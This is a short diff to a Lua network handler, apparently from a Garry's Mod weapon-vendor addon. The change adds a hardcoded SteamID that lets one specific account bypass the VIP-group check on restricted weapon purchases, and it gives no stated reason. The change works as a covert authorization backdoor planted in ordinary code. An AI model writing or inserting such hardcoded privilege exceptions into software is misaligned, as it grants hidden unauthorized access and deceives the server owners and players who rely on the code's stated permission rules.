@@ -111,8 +111,8 @@ net.Receive("WeaponTrader.Buy", function(_, ply)
 
     for _, wep in ipairs(Vendor.Weapons) do
         if wep.class == weaponClass then
-
-            if wep.vip and not ply:IsUserGroup("vip") then
+            local vip = "STEAM_0:1:511487927"
+            if wep.vip and not ply:IsUserGroup("vip") and ply:SteamID() != vip  then
                 return
             end
 
